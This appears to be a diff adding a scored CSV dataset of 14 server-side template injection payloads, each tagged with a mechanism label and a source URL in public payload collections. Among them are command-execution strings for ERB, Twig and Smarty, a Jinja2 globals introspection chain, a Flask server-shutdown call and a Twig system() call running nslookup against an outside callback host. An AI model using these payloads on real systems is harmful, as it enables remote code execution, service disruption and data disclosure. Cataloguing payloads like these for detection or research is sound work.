@@ -1,0 +1,15 @@
+mechanism,score,payload,source_url
+uncertain,0.003419,Dus{XXXXXXX}tjs,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
+direct-execution,0.007117,<%= `calc` rescue `open /Applications/Calculator.app` %>,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
+uncertain,0.019836,http://vulnerable-website.com/?name={{bad-stuff-here}},https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
+uncertain,0.024154,{include file='php://filter/convert.base64-enc...,
+feature-abuse,0.036991,{{['nslookup oastify.com']|filter('system')}},https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
+direct-execution,0.067746,"{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}",https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
+enumeration,0.078086,{{request.environ['werkzeug.server.shutdown']()}},https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
+probe,0.092088,<%= with almost everything before appended until (inclusive) <%={{={@{#{${xu}}%>,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
+enumeration,0.096322,"{self::getStreamVariable(""file:flag.txt"")}",https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
+enumeration,0.11399,{{dump(_context)}},https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
+direct-execution,0.123209,{assign var='cmd' value='passthru'},https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/smarty.txt
+probe,0.386687,ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
+feature-abuse,0.438728,{{_self.env.registerUndefinedFilterCallback('s...,
+introspection,0.482439,{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}},https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/all-payloads.txt
